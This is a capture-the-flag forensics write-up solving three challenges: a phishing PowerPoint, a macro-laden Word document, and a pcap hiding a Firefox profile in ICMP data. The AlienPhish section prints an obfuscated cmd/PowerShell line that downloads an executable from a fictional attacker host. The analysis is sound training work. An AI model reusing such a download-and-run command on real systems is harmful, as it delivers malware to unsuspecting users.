# Forensics

## AlienPhish

> Solved by : Starry-Lord

* Unzip and find 'Alien Weaknesses.pptx'
* Unzip again and go to ppt/slides/_rels/
* Read slide1.xml.rels to find a suspicious relation tag

```
    cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22
```

* Go to cyberchef 
* From url decode 
* Reverse 

```
    "%=!XCk*:XCk% llac 0 qel X% fi;pma&;pma&!1,X%~:My!!XCk!=XCk tes od)0;1-;221( ni X% L/ rof;pma&;pma&powershell -c "$o = $env:temp   'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe'; iwr http:/destroyearth.alien/x.exe -outfile $o"=My tes"C/NO:V/ exe.dmc
```

```
    Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99
```

* From base64 and select the urlSafe alphabet

```
CHTB{pH1sHiNg_w0_m4cr0s???}
```

## Invitation

> Solved By : Starry-Lord

* So we get a docm file. 
* I start by unzippping the word document 
* We get a docm
* Unzip it again and see folders

![](https://i.imgur.com/Q7ZRb7J.jpg)

**PART 1**

* First thing I tried to do after looking around was 

```bash
strings vbaProject.bin
```

* Which gives back interesting hex lines. 

![](https://i.imgur.com/knF1In2.jpg)

* Then decrypt from hex

![](https://i.imgur.com/RNhR8uO.jpg)

* From base64 urlsafe alphabet will show the following 

![](https://i.imgur.com/clunBcD.jpg)

```
CHTB{maldocs_are
```

**PART 2**

* Upload full vbaProject file this time and do the same as before. 

![](https://i.imgur.com/wgeYgSG.jpg)

* Use base64 urlsafe alphabet
* We get second part of the flag by reversing

```
_the_new_meta}
```
```
CHTB{maldocs_are_the_new_meta}
```

---

## Oldest trick in the book

> Solved by : thewhiteh4t


* We are given a pcap which consists of mostly TLS and ICMP traffic
* ICMP looks promising as we can see the header of ZIP file `PK`

![](https://i.imgur.com/bcZ05AG.png)

* Another thing was that the the traffic from both IP address was similar I focused on only one of them


![](https://i.imgur.com/Iq12mh1.png)

* To extract data of all these packets I used tshark

```bash
$ tshark -r older_trick.pcap -T fields -e data.data -Y "ip.src == 192.168.1.7" > 192.168.1.7.txt
```

* After this I looked for duplicate packets in the text file

![](https://i.imgur.com/NoiYgXk.png)

* So we have 10127 unique icmp data packets
* To decode hex and compile all the data I created a small python script
* But I was not getting proper file format of resultant file so I inspected the data
* There were duplicates in the data as well!

```
b7ae04 0000000000 504b0304140000000000729e8d52659b 504b0304140000000000729e8d52659b 504b030414000000
ead104 0000000000 4c6b1800000018000000100000006669 4c6b1800000018000000100000006669 4c6b180000001800
99e804 0000000000 6e692f6164646f6e732e6a736f6e7b22 6e692f6164646f6e732e6a736f6e7b22 6e692f6164646f6e
cafb04 0000000000 736368656d61223a362c226164646f6e 736368656d61223a362c226164646f6e 736368656d61223a
```

* This is the data from first 4 packets for an example
* After first 6 characters we have 10 zeroes
* After that a unique string
* The string is repeated after that
* Then a partial repetition can be seen at the end
* I tried various combinations and in the end only the unique string was needed from each packet i.e `504b0304140000000000729e8d52659b` for first line as an example

```python
#!/usr/bin/env python3
import binascii
msg = []
with open('unique.txt', 'r') as raw:
    raw_arr = raw.readlines()
for line in raw_arr:
    if len(line) == 97:
        line = line.strip()
        line = line[16:48]
        plain = binascii.unhexlify(line)
        msg.append(plain)
with open('result.zip', 'wb') as res:
    for line in msg:
        res.write(line)
```

* The script iterates over each line in the file and skips empty lines if it finds any
* Then it slices of extra characters as stated above
* Then it decodes the hex into binary data and appends it in a file

![](https://i.imgur.com/H2fC7L3.png)

* And we get a proper zip file!
* Here are the extracted contents of the zip

![](https://i.imgur.com/8a1GAJB.png)

* After some enumeration of all files they point towards Mozilla Firefox
* After some googling I found that this is a firefox profile dump
* In linux the default path for profiles is `/home/user/.mozilla/firefox`
* I copied the folder into profiles folder and then edited the `profiles.ini` file present inside it to add the following entry

```
[Profile2]
Name=fini
Path=fini
IsRelative=1
```

* After this I launched firefox from CLI using 

```bash
$ firefox -P
```

* It provides an option to choose a specific profile and launch the browser with it

![](https://i.imgur.com/KZzqT9x.png)

* After the browser launched with the new profile and checked the saved logins and here we have the flag!

![](https://i.imgur.com/dHKQmSM.png)